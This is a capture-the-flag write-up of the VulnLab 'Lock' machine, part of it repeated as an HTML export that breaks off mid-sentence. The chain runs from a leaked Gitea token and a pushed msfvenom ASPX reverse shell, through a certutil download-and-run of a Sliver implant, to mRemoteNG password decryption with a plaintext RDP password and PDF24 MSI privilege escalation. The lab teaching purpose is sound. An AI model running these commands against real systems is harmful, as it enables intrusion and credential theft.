attention back to the Git repository that we found earlier. We have a GITEA access token, meaning we can potentially push to the branch of the repositories that we have access to. For `ellen.freeman`, you could only see the `dev-scripts` repository. However, let's take a look at this at command-line as you'll find something a bit odd.\n\n```\n└─$ git clone http://10.10.69.193:3000/ellen.freeman/dev-scripts.git\n```\n\nIf we examine the code a bit again, you'll see that we need two parameters for this. The first is ensuring that our GITEA_ACCESS_TOKEN environment variable is set to an access token that we own. As you already know, we have access to `ellen.freeman`'s token. The second parameter that is needed is the link to the GITEA instance on port `3000`.\n\nLet's also be sure to set the GITEA_ACCESS_TOKEN global variable to ensure that if there is any authentication required, we can access the machine properly. `export GITEA_ACCESS_TOKEN=43ce39bb0bd6bc489284f2905f033ca467a6362f`\n\n```\n└─$ python repos.py http://10.10.69.193:3000\n/home/daz/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.7) or chardet (5.2.0)/charset_normalizer (2.0.9) doesn't match a supported version!\n  warnings.warn(\"urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported \"\nRepositories:\n- ellen.freeman/dev-scripts\n- ellen.freeman/website\n```\n\nIt seems that there is another repository that was returned that wasn't originally in the GITEA interface, being `website`. This repo seems to be unpublished from the GITEA instance, as if you attempt to access it on the web server it will return a 404.\n\nThough we aren't able to see this repository, we can assume that if we were authenticated as `ellen.freeman`, we would be able to see it on our end. We can try to configure our Git authorization locally using the access token and download the repository remotely.\n\n```\n└─$ git config --global http.extraHeader \"Authorization: token $GITEA_ACCESS_TOKEN\"\n\n└─$ git clone http://10.10.69.193:3000/ellen.freeman/website                       \nCloning into 'website'...\nremote: Enumerating objects: 165, done.\nremote: Counting objects: 100% (165/165), done.\nremote: Compressing objects: 100% (128/128), done.\nremote: Total 165 (delta 35), reused 153 (delta 31), pack-reused 0\nReceiving objects: 100% (165/165), 7.16 MiB | 1.00 MiB/s, done.\nResolving deltas: 100% (35/35), done.\n```\n\nIt seems that there is a file within this denoted as `readme.md` and it contains the following information.\n\n```\n# New Project Website\n\nCI/CD integration is now active - changes to the repository will automatically be deployed to the webserver\n```\n\nThis indicates to me that any changes to this repository automatically change the website that is being hosted from it. If you'll look at the `index.html` page that is within this directory, you'll find the HTML of the website we were previously on. This also contains the assets folder that we previously did not have access to.\n\nWith what this readme note is telling us, if we are able to commit to this repository, it should automatically deploy to the website on port 80. Thus, if we are able to add a reverse shell to this website, we may be able to receive a session on the website.\n\nIn that case, we'll create a reverse shell with [MSFVenom](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom). I've found more luck utilizing an ASPX reverse shell on websites that run IIS, so we'll go with that extension.\n\nOne thing you can do to confirm our above theory is attempt to access `changelog.txt` on the main website. It should return the same text file that we have in our cloned git repository locally.\n\n![](/images/vulnlab/lock-vl/g.png)\n\n# RCE via Git Commits\n\nSo let's start by creating an ASPX reverse shell with MSFVenom.\n\n```\n└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.0.173 LPORT=9001 -f aspx > daz.aspx\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 354 bytes\nFinal size of aspx file: 2906 bytes\n```\n\nWe'll now put our reverse shell within the same directory as the website assets, if it wasn't already.\n\nYou'll see that there is no need for us to initialize this git repository, as the folder has already been preconfigured if you run `ls -la`. The `.git` submodule indicates that to us.\n\n```\n└─$ ls -la \ntotal 44\ndrwxrwxr-x 4 daz daz  4096 Jun  3 21:31 .\ndrwxrwxr-x 4 daz daz  4096 Jun  3 21:23 ..\ndrwxrwxr-x 8 daz daz  4096 Jun  3 21:23 .git\ndrwxrwxr-x 6 daz daz  4096 Jun  3 21:23 assets\n-rw-rw-r-- 1 daz daz    43 Jun  3 21:23 changelog.txt\n-rw-rw-r-- 1 daz daz  2906 Jun  3 21:32 daz.aspx\n-rw-rw-r-- 1 daz daz 15708 Jun  3 21:23 index.html\n-rw-rw-r-- 1 daz daz   130 Jun  3 21:23 readme.md\n```\n\nNext, we can add all of the new additions to the repository (being our reverse shell and the README.md file) and commit them to the branch. We will then push to the main branch and the files should be uploaded correctly.\n\n```\n└─$ git add -A; git commit -m \"DaZ Commit 1\"\n\n└─$ git push origin main                    \nEnumerating objects: 4, done.\nCounting objects: 100% (4/4), done.\nDelta compression using up to 4 threads\nCompressing objects: 100% (3/3), done.\nWriting objects: 100% (3/3), 1.32 KiB | 1.32 MiB/s, done.\nTotal 3 (delta 1), reused 0 (delta 0), pack-reused 0\nremote: . Processing 1 references\nremote: Processed 1 references in total\nTo http://10.10.69.193:3000/ellen.freeman/website\n   73cdcc1..9dac976  main -> main\n```\n\nBefore we execute the file, we'll start up `msfconsole` and configure the listener based on our payload. We're using a meterpreter payload, so we'll need to set that up in `exploit/multi/handler`.\n\n```\nmsf6 > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > set LHOST 10.8.0.173\nLHOST => 10.8.0.173\nmsf6 exploit(multi/handler) > set LPORT 9001\nLPORT => 9001\n\nmsf6 exploit(multi/handler) > exploit\n\n[*] Started reverse TCP handler on 10.8.0.173:9001\n```\n\nNote that my IP address adjust due to some conflictions I was having with the website - I made sure to reload the machine and it worked fine. The new IP address is `10.10.66.232`. Now that's finished, we'll access the website to execute our payload. We can simply curl the payload from our terminal in order to execute it. `curl http://10.10.66.232`.\n\n```\n[*] Command shell session 1 opened (10.8.0.173:9001 -> 10.10.66.232:49892) at 2024-06-03 22:24:55 -0400\n\nShell Banner:\nMicrosoft Windows [Version 10.0.20348.2159]\n-----\nc:\\windows\\system32\\inetsrv>\n```\n\n# Reconnaissance on Host\n\nNow that we have access to the machine, we can look around to see if there's any files that will return any valid information. We're currently running as `inetsrv`, meaning we'll need to compromise a user in order to progress any further.\n\nI set up a Sliver C2 server on this machine to ensure that we could access the resources to and from relatively easily. I normally use Havoc on Windows machines, though as you can see there is no AV enabled on this machine.\n\n```\nPS C:\\Gitea\\data> \"Invoke-Mimikatz\"\n\"Invoke-Mimikatz\"\nInvoke-Mimikatz\n```\n\nYou can curl the Sliver implant after creating it to the machine by using `certutil.exe`.\n\n```\nPS C:\\temp> certutil.exe -urlcache -f http://10.8.0.173:9002/lock.exe lock.exe; .\\lock.exe\n```\n\nThere seems to be a decent amount of programs installed on the machine, however you'll notice that there are two users within `C:\\Users`.\n\n```\n    Directory: C:\\Users\n\nMode                 LastWriteTime         Length Name                                           \n----                 -------------         ------ ----   \nd-----        12/27/2023   2:00 PM                .NET v4.5                                      \nd-----        12/27/2023   2:00 PM                .NET v4.5 Classic\nd-----        12/27/2023  12:01 PM                Administrator    \nd-----        12/28/2023  11:36 AM                ellen.freeman  \nd-----        12/28/2023   6:14 AM                gale.dekarios  \nd-r---        12/27/2023  10:21 AM                Public\n```\n\nWhat's interesting is that we have access to `ellen.freeman`'s home directory. While there isn't a flag in this user's home directory, there is an interesting file in their home directory.\n\n```\nPS C:\\Users\\ellen.freeman\\Documents> cat config.xml\ncat config.xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<mrng:Connections xmlns:mrng=\"http://mremoteng.org\" Name=\"Connections\" Export=\"false\" EncryptionEngine=\"AES\" BlockCipherMode=\"GCM\" KdfIterations=\"1000\" FullFileEncryption=\"false\" Protected=\"sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp\" ConfVersion=\"2.6\">\n<Node Name=\"RDP/Gale\" Type=\"Connection\" Descr=\"\" Icon=\"mRemoteNG\" Panel=\"General\"\n......\n```\n\nYou'll see that this is an XML file containing the password information for the user `Gale.Dekarios`. This was the other user within `C:\\Users` aside from `ellen.freeman`.\n\nThe file itself seems to be related to `mRemoteNG` and also having an affiliation with RDP. Assuming that we are able to crack the hash within this XML, we could login as this user.\n\n# Decrypting mRemoteNG Hashes\n\nI did a bit of research into mRemoteNG, and it seems to be an application that function relatively similarly to RDP. Our application at hand is a fork of mRemote, which is an open-source remote connection manager for Windows. This specific application supports protocols such as RDP, VNC, SSH, and may more. You can find documentation related to mRemoteNG [here](https://mremoteng.readthedocs.io/en/v1.77.3-dev/).\n\nI also found a repository that contains a decryption script for mRemoteNG specifically. You can find that [here](https://github.com/gquere/mRemoteNG_password_decrypt). Note that if it now prompting you to enter credentials when you clone the repository, that is due to the fact that a `.gitconfig` file was created in your home directory when we were exploiting Gitea earlier. You can delete this `.gitconfig` file to prevent it for prompting you for credentials.\n\nThe script itself seems to be utilizing AES and PBKDF2_HMAC_SHA1 decryption in order to retrieve the plaintext password. The script uses the salt specified in `config.xml` and Base64 decoding in order to decrypt the password.\n\nLet's download this config file containing the credentials to our machine and run the script against it.\n\n```\n└─$ python3 mRemoteNG_password_decrypt/mremoteng_decrypt.py config.xml  \nName: RDP/Gale\nHostname: Lock\nUsername: Gale.Dekarios\nPassword: [...snip...]\n```\n\nIt seems as though the password was decrypted successfully! We should be able to log in as `Gale.Dekarios` through RDP, given that mRemoteNG supports RDP as a protocol.\n\n```\n└─$ xfreerdp /v:10.10.66.232 /u:Gale.Dekarios /p:ty8wnW9qCKDosXo6\n```\n\n![](/images/vulnlab/lock-vl/h.png)\n\n# Exploiting PDF24\n\nThe user flag is located within the user's Desktop directory, as you can see from the landing page for RDP. Given that we have this user flag now, we'll need to exploit something in order to gain elevated privileges to Administrator.\n\nLet's check our privileges in order to determine whether or not we can exploit any misconfigured privileges for this user.\n\n```\nPS C:\\Users\\gale.dekarios> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== ========\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Disabled\n```\n\nWe don't have any privileges aside from the default privileges that are given to regular users.\n\nOne of the key thought processes I use for privilege escalation against Windows is understanding the three types of ways that privilege escalation can be obtained. This can be achieved either by **exploiting misconfigured privileges**, **exploiting LDAP objects**, and **exploiting internal applications**. Given that we don't have any way to exploit the first two, let's look around for any applications that are installed.\n\nImmediately on the home screen, you'll notice that there's an odd application installed called PDF24. The interesting part about this file is not in the application itself, but the fact that there is a hidden installation directory with the installer to this application on the machine.\n\n![](/images/vulnlab/lock-vl/i.png)\n\nLet's do some research into this binary and see if there are any ways that we could potentially exploit it.\n\nAlmost immediately, I found a local privilege escalation vulnerability to PDF24 through the installer that I had referred to before. You can find information about that [here](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/#:~:text=The%20MSI%20installer%20of%20PDF24,the%20privileges%20to%20SYSTEM%20level.).\n\nIt seems as though the MSI installer of this application is vulnerable to a local privilege escalation vulnerability, which can only be achieved with GUI access. Given that we have RDP access, this presents itself as a valid attack path for us to receive SYSTEM. The exploit works when using the repair function with `msiexec.exe`, as a SYSTEM level command shell is utilized in order to suffice the installation process.\n\nDuring the installation, we can utilize a tool called [SetOpLock](https://github.com/googleprojectzero/symboliclink-testing-tools). This is within the `symbolic-testing-tools` suite that seems to be a relatively normal application. This application could be vulnerable to AV, however it does not seem to be an issue in our case since AV is enabled.\n\nTo explain as to what this binary will do, it will essentially create a breakpoint on the opcode where `PDF24-PrinterInstall.exe` is called. The reason for this is that a SYSTEM shell is spawned by the machine in order to install this specific portion, and if we are able to pause the shell at the moment it is called, we can exploit the shell to exploit commands for us. This should lead to us getting access to the shell with SYSTEM privileges.\n\nSo with that, let's compile the executable with Visual Studio and transfer it to our Kali machine, then finally to the RDP session. I did this locally, though if you are running WSL or any alternative with Windows you should be able to exploit this without needing to transfer this through SSH to your Kali machine. Make sure to build the `Release/x64` version of this binary so it works correctly.\n\nLet's first run the installation as directed in the article.\n\n```\nPS C:\\_install> .\\SetOpLock.exe \"C:\\Program Files\\PDF24\\faxPrnInst.log\" r\n```\n\nAfter the installation process starts up, run the below command to execute the oplock hang. If it is working successfully, you should NOT receive an output.\n\n```\nPS C:\\_install> .\\SetOpLock.exe \"C:\\Program Files\\PDF24\\faxPrnInst.log\" r\n```\n\nDuring the end of this process, you'll see a SYSTEM shell pop up. If this SYSTEM shell remains on the screen, that means the opcode lock worked correctly. However, if the SYSTEM shell pops up for a brief moment and goes away, then there was some form of error with the binary.\n\n![](/images/vulnlab/lock-vl/j.png)\n\nWe now technically have a SYSTEM shell, though we don't have any way to type anything. If we continue to follow the article, we can use Firefox to launch a SYSTEM shell based on the context of the frozen shell currently in front of us.\n\nFirst, right-click on the top bar of the command shell window. This should bring up a small details interface.\n\nThen, we'll select properties to view the current properties of the shell.\n\nWe'll then select the the `legacy console mode` hyperlink towards the bottom of the properties pane. This should open up a Firefox session in the context of SYSTEM.\n\nWithin Firefox, we can now press the hotkey `Ctrl + O` to open up the filesystem. Remember, we are still running this in the context of SYSTEM.\n\nFinally, type `cmd.exe` into the search bar, which should save `cmd.exe` locally and allow you to run it by clicking on it in the `Downloads pane`.\n\nIf all was done correctly, you should have a shell as SYSTEM!\n\n![](/images/vulnlab/lock-vl/k.png)\n\nNow that we have access to this machine as SYSTEM, we essentially have control over the entirety of the machine and all of its files. We should be able to access the root flag in `C:\\Users\\Administrator\\Desktop\\root.txt`. This means we have successfully compromised this machine!\n\n![](/images/vulnlab/lock-vl/l.png)\n\n# Conclusion\n\nThis machine was very entertaining, especially the PDF24 local privilege escalation portion. The fact that setting the opcode perfectly at the only point in time where a SYSTEM shell was executed made perfect sense logically. Furthermore, the start of the machine really tests your ability to prevent going down rabbit holes. This is a nice change of pace, and don't forget to test EVERYTHING out and don't hang on something for too long! Big thanks to xct and kozie for the development of this machine.\n\n# Resources\n\nhttps://www.speedguide.net/port.php?port=3000\nhttps://docs.gitea.com/next/development/api-usage\nhttps://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom\nhttps://mremoteng.readthedocs.io/en/v1.77.3-dev/\nhttps://github.com/gquere/mRemoteNG_password_decrypt\nhttps://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/#:~:text=The%20MSI%20installer%20of%20PDF24,the%20privileges%20to%20SYSTEM%20level.\nhttps://github.com/googleprojectzero/symboliclink-testing-tools","slug":"lock","published":1,"updated":"2024-06-05T20:04:44.649Z","_id":"clx25bdl600005euf7v8v1ct4","comments":1,"layout":"post","photos":[],"content":"<p>This is the last writeup I have documented for all of the Easy machines as of 6&#x2F;3. This machine in particular is related to Gitea, a web-application that we’ve pen-tested before on our writeup of Build. This then follows a really intuitive exploit of a PDF application by creating a breakpoint at a specific opcode for privilege escalation.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Let’s start with our usual NMAP scan.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-03 17:05 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.82.24</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 65529 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">80/tcp   open  http</span><br><span class=\"line\">445/tcp  open  microsoft-ds</span><br><span class=\"line\">3000/tcp open  ppp</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\">5357/tcp open  wsdapi</span><br><span class=\"line\">5985/tcp open  wsman</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 607.91 seconds</span><br></pre></td></tr></table></figure>\n\n<p>There seems to be an SMB server, however null authentication does not allow us to view the service. This means we’ll need credentials if we want to access this service.</p>\n<p>There is a web server running on port 80, so we’ll take a look at that to see what we can find.</p>\n<p><img src=\"/images/vulnlab/lock-vl/b.png\"></p>\n<p>We seem to be within a basic IIS website that use Lightbox and AOS JS. The web framework for this is Microsoft ASP.NET, indicating to us that this machine is a Windows server.</p>\n<p>I ran a directory enumeration scan as described below, however no pertinent results seem to return.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ gobuster dir -u http://10.10.82.24 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</span><br><span class=\"line\">......</span><br><span class=\"line\">/assets               (Status: 301) [Size: 149] [--&gt; http://10.10.82.24/assets/]</span><br></pre></td></tr></table></figure>\n\n<p>There is however an <code>/assets</code> folder that is returned that we do not have access to. Attempting to follow the redirect will bring you to a <code>403</code> error, indicating that we do not have the correct authorization to view this page.</p>\n<p><img src=\"/images/vulnlab/lock-vl/c.png\"></p>\n<p>Let’s move onto port 3000. I’ve dealt with this port a few times before for these writeups on VulnLab, and you can find information about this specific port <a href=\"https://www.speedguide.net/port.php?port=3000\">here</a>. There are a variety of different web applications that can be hosted on this port, and we’ve dealt with Gitea and Grafana in the past.</p>\n<p>Accessing this port through HTTP seems to bring us to another familiar site - Gitea.</p>\n<p><img src=\"/images/vulnlab/lock-vl/d.png\"></p>\n<p>The only difference in our case for this machine is that there is no register option, as there was for Build. That being said, we can run another <code>gobuster</code> scan on this port to determine if there are any resources that we can access.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/admin                (Status: 303) [Size: 38] [--&gt; /user/login]</span><br><span class=\"line\">/issues               (Status: 303) [Size: 38] [--&gt; /user/login]</span><br><span class=\"line\">/v2                   (Status: 401) [Size: 50]</span><br><span class=\"line\">/explore              (Status: 303) [Size: 41] [--&gt; /explore/repos]</span><br><span class=\"line\">/administrator        (Status: 200) [Size: 16427]</span><br></pre></td></tr></table></figure>\n\n<p>We seem to receive a 200 request on <code>/administrator</code>, along with the indication of a potential API on <code>/v2</code>. If we attempt to access <code>/administrator</code>, it seems that Gitea authenticates us to the web service. This more than likely is a misconfiguration that shouldn’t be here, but nonetheless we were able to access the internal resources for Gitea.</p>\n<p>If you visit the <code>Explore</code> tab, you’ll see that there is a repository for ellen.freeman denoted as <code>dev-scripts</code>. Accessing this will give us the ability to view a Python file denoted as <code>repos.py</code>.</p>\n<p>Following the file seems to bring us to a Python script that is affiliated with the API. The script is attempting to receive a repository based on the domain name of the machine and retrieves a Git access token to check authentication for the current user. The script then parses the users repositories on GITEA before executing the script.</p>\n<p>You’ll notice though from the main branch of the repository that there are two commits to this branch. We are currently viewing the most recent commit, however if we view the first commit to this branch we’ll find some interesting information.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">import sys</span><br><span class=\"line\"></span><br><span class=\"line\">PERSONAL_ACCESS_TOKEN = &#x27;43ce39bb0bd6bc489284f2905f033ca467a6362f&#x27;</span><br><span class=\"line\">import os</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n\n<p>There seems to be a personal Git access token on the first commit for the file. This was more than likely the case of a user putting this here temporarily before making the proper commits to the update main file. We can guess that the user forgot to delete our ability to view this commit - which lead to our visibility of it. We’ll cache this in the meanwhile as we continue to enumerate into the machine more.</p>\n<p>If you go back to the main file, you’ll see that there’s a path to the API denoted as <code>/api/v1/user/repos</code>. I’m going to assume that this specifically is related to the GITEA website that we’re on, however there’s the potential for it to be linked to the main website.</p>\n<p><img src=\"/images/vulnlab/lock-vl/e.png\"></p>\n<p>The API seems to tell us that a token is required, and references us to another directory denoted as <code>/api/swagger</code>. Let’s try to access this to retrieve the necessary token required.</p>\n<p><img src=\"/images/vulnlab/lock-vl/f.png\"></p>\n<p>This brings us to the Gitea API, which seems to have all the web resources that Gitea uses in terms of authorization and request management. We have various tabs here denoted for administration, the specific user information, repository information, and many more.</p>\n<p>I did some research into the Gitea API and it seems that there is some information regarding the API and token generation. You can find the source I used for this <a href=\"https://docs.gitea.com/next/development/api-usage\">here</a>. Given what we know based on the research, it seems as though we can use cURL for this functionality. Note at this point I did take a break, so the IP addresses may change.</p>\n<p>I looked into this API functionality for quite some time, however I couldn’t manage to use it for really anything. It seems like we have the ability to execute a function to receive a token, but our authorization seems to be invalid. After a bit of continuous messing around with next to no progress, I deduced this to be a rabbit hole.</p>\n<h1 id=\"Reversing-the-Git-Repo\"><a href=\"#Reversing-the-Git-Repo\" class=\"headerlink\" title=\"Reversing the Git Repo\"></a>Reversing the Git Repo</h1><p>I want to turn our attention back to the Git repository that we found earlier. We have a GITEA access token, meaning we can potentially push to the branch of the repositories that we have access to. For <code>ellen.freeman</code>, you could only see the <code>dev-scripts</code> repository. However, let’s take a look at this at command-line as you’ll find something a bit odd.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ git clone http://10.10.69.193:3000/ellen.freeman/dev-scripts.git</span><br></pre></td></tr></table></figure>\n\n<p>If we examine the code a bit again, you’ll see that we need two parameters for this. The first is ensuring that our GITEA_ACCESS_TOKEN environment variable is set to an access token that we own. As you already know, we have access to <code>ellen.freeman</code>‘s token. The second parameter that is needed is the link to the GITEA instance on port <code>3000</code>.</p>\n<p>Let’s also be sure to set the GITEA_ACCESS_TOKEN global variable to ensure that if there is any authentication required, we can access the machine properly. <code>export GITEA_ACCESS_TOKEN=43ce39bb0bd6bc489284f2905f033ca467a6362f</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python repos.py http://10.10.69.193:3000</span><br><span class=\"line\">/home/daz/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.7) or chardet (5.2.0)/charset_normalizer (2.0.9) doesn&#x27;t match a supported version!</span><br><span class=\"line\">  warnings.warn(&quot;urllib3 (&#123;&#125;) or chardet (&#123;&#125;)/charset_normalizer (&#123;&#125;) doesn&#x27;t match a supported &quot;</span><br><span class=\"line\">Repositories:</span><br><span class=\"line\">- ellen.freeman/dev-scripts</span><br><span class=\"line\">- ellen.freeman/website</span><br></pre></td></tr></table></figure>\n\n<p>It seems that there is another repository that was returned that wasn’t originally in the GITEA interface, being <code>website</code>. This repo seems to be unpublished from the GITEA instance, as if you attempt to access it on the web server it will return a 404.</p>\n<p>Though we aren’t able to see this repository, we can assume that if we were authenticated as <code>ellen.freeman</code>, we would be able to see it on our end. We can try to configure our Git authorization locally using the access token and download the repository remotely.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ git config --global http.extraHeader &quot;Authorization: token $GITEA_ACCESS_TOKEN&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ git clone http://10.10.69.193:3000/ellen.freeman/website                       </span><br><span class=\"line\">Cloning into &#x27;website&#x27;...</span><br><span class=\"line\">remote: Enumerating objects: 165, done.</span><br><span class=\"line\">remote: Counting objects: 100% (165/165), done.</span><br><span class=\"line\">remote: Compressing objects: 100% (128/128), done.</span><br><span class=\"line\">remote: Total 165 (delta 35), reused 153 (delta 31), pack-reused 0</span><br><span class=\"line\">Receiving objects: 100% (165/165), 7.16 MiB | 1.00 MiB/s, done.</span><br><span class=\"line\">Resolving deltas: 100% (35/35), done.</span><br></pre></td></tr></table></figure>\n\n<p>It seems that there is a file within this denoted as <code>readme.md</code> and it contains the following information.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># New Project Website</span><br><span class=\"line\"></span><br><span class=\"line\">CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver</span><br></pre></td></tr></table></figure>\n\n<p>This indicates to me that any changes to this repository automatically change the website that is being hosted from it. If you’ll look at the <code>index.html</code> page that is within this directory, you’ll find the HTML of the website we were previously on. This also contains the assets folder that we previously did not have access to.</p>\n<p>With what this readme note is telling us, if we are able to commit to this repository, it should automatically deploy to the website on port 80. Thus, if we are able to add a reverse shell to this website, we may be able to receive a session on the website.</p>\n<p>In that case, we’ll create a reverse shell with <a href=\"https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom\">MSFVenom</a>. I’ve found more luck utilizing an ASPX reverse shell on websites that run IIS, so we’ll go with that extension.</p>\n<p>One thing you can do to confirm our above theory is attempt to access <code>changelog.txt</code> on the main website. It should return the same text file that we have in our cloned git repository locally.</p>\n<p><img src=\"/images/vulnlab/lock-vl/g.png\"></p>\n<h1 id=\"RCE-via-Git-Commits\"><a href=\"#RCE-via-Git-Commits\" class=\"headerlink\" title=\"RCE via Git Commits\"></a>RCE via Git Commits</h1><p>So let’s start by creating an ASPX reverse shell with MSFVenom.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.0.173 LPORT=9001 -f aspx &gt; daz.aspx</span><br><span class=\"line\">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class=\"line\">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class=\"line\">No encoder specified, outputting raw payload</span><br><span class=\"line\">Payload size: 354 bytes</span><br><span class=\"line\">Final size of aspx file: 2906 bytes</span><br></pre></td></tr></table></figure>\n\n<p>We’ll now put our reverse shell within the same directory as the website assets, if it wasn’t already.</p>\n<p>You’ll see that there is no need for us to initialize this git repository, as the folder has already been preconfigured if you run <code>ls -la</code>. The <code>.git</code> submodule indicates that to us.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ ls -la </span><br><span class=\"line\">total 44</span><br><span class=\"line\">drwxrwxr-x 4 daz daz  4096 Jun  3 21:31 .</span><br><span class=\"line\">drwxrwxr-x 4 daz daz  4096 Jun  3 21:23 ..</span><br><span class=\"line\">drwxrwxr-x 8 daz daz  4096 Jun  3 21:23 .git</span><br><span class=\"line\">drwxrwxr-x 6 daz daz  4096 Jun  3 21:23 assets</span><br><span class=\"line\">-rw-rw-r-- 1 daz daz    43 Jun  3 21:23 changelog.txt</span><br><span class=\"line\">-rw-rw-r-- 1 daz daz  2906 Jun  3 21:32 daz.aspx</span><br><span class=\"line\">-rw-rw-r-- 1 daz daz 15708 Jun  3 21:23 index.html</span><br><span class=\"line\">-rw-rw-r-- 1 daz daz   130 Jun  3 21:23 readme.md</span><br></pre></td></tr></table></figure>\n\n<p>Next, we can add all of the new additions to the repository (being our reverse shell and the README.md file) and commit them to the branch. We will then push to the main branch and the files should be uploaded correctly.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ git add -A; git commit -m &quot;DaZ Commit 1&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ git push origin main                    </span><br><span class=\"line\">Enumerating objects: 4, done.</span><br><span class=\"line\">Counting objects: 100% (4/4), done.</span><br><span class=\"line\">Delta compression using up to 4 threads</span><br><span class=\"line\">Compressing objects: 100% (3/3), done.</span><br><span class=\"line\">Writing objects: 100% (3/3), 1.32 KiB | 1.32 MiB/s, done.</span><br><span class=\"line\">Total 3 (delta 1), reused 0 (delta 0), pack-reused 0</span><br><span class=\"line\">remote: . Processing 1 references</span><br><span class=\"line\">remote: Processed 1 references in total</span><br><span class=\"line\">To http://10.10.69.193:3000/ellen.freeman/website</span><br><span class=\"line\">   73cdcc1..9dac976  main -&gt; main</span><br></pre></td></tr></table></figure>\n\n<p>Before we execute the file, we’ll start up <code>msfconsole</code> and configure the listener based on our payload. We’re using a meterpreter payload, so we’ll need to set that up in <code>exploit/multi/handler</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">msf6 &gt; use exploit/multi/handler</span><br><span class=\"line\">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class=\"line\">msf6 exploit(multi/handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class=\"line\">PAYLOAD =&gt; windows/meterpreter/reverse_tcp</span><br><span class=\"line\">msf6 exploit(multi/handler) &gt; set LHOST 10.8.0.173</span><br><span class=\"line\">LHOST =&gt; 10.8.0.173</span><br><span class=\"line\">msf6 exploit(multi/handler) &gt; set LPORT 9001</span><br><span class=\"line\">LPORT =&gt; 9001</span><br><span class=\"line\"></span><br><span class=\"line\">msf6 exploit(multi/handler) &gt; exploit</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Started reverse TCP handler on 10.8.0.173:9001</span><br></pre></td></tr></table></figure>\n\n<p>Note that my IP address adjust due to some conflictions I was having with the website - I made sure to reload the machine and it worked fine. The new IP address is <code>10.10.66.232</code>. Now that’s finished, we’ll access the website to execute our payload. We can simply curl the payload from our terminal in order to execute it. <code>curl http://10.10.66.232</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[*] Command shell session 1 opened (10.8.0.173:9001 -&gt; 10.10.66.232:49892) at 2024-06-03 22:24:55 -0400</span><br><span class=\"line\"></span><br><span class=\"line\">Shell Banner:</span><br><span class=\"line\">Microsoft Windows [Version 10.0.20348.2159]</span><br><span class=\"line\">-----</span><br><span class=\"line\">c:\\windows\\system32\\inetsrv&gt;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Reconnaissance-on-Host\"><a href=\"#Reconnaissance-on-Host\" class=\"headerlink\" title=\"Reconnaissance on Host\"></a>Reconnaissance on Host</h1><p>Now that we have access to the machine, we can look around to see if there’s any files that will return any valid information. We’re currently running as <code>inetsrv</code>, meaning we’ll need to compromise a user in order to progress any further.</p>\n<p>I set up a Sliver C2 server on this machine to ensure that we could access the resources to and from relatively easily. I normally use Havoc on Windows machines, though as you can see there is no AV enabled on this 